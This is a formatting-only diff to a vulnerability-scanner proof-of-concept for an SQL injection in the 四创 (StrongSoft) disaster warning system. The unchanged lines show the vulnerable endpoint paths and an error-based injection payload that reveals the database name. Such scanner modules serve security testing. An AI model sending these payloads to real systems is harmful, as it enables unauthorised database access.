@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'StrongSoft_0001' # 平台漏洞编号，留空
+    vuln_id = 'StrongSoft_0001'  # 平台漏洞编号，留空
     name = '四创灾害预警系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-01-12'  # 漏洞公布时间
     desc = '''
         四创灾害预警系统
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     product = '四创灾害预警系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '8c9b3778-97d6-4b23-a539-68b7788880db'
     author = '47bwy'  # POC编写者
@@ -33,9 +35,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-091242
-            #http://www.wooyun.org/bugs/wooyun-2010-091284
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-091242
+            # http://www.wooyun.org/bugs/wooyun-2010-091284
             payload1 = '/Disaster/ReportCount.aspx?tabnm=1'
             payload2 = '/Disaster/OutGBExcel.aspx?tabnm=a&qtype=b&queryvalue=1'
             getdata1 = '%27%2b(select+1+where+1=convert(int,db_name(1)))%2b%27'
@@ -58,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
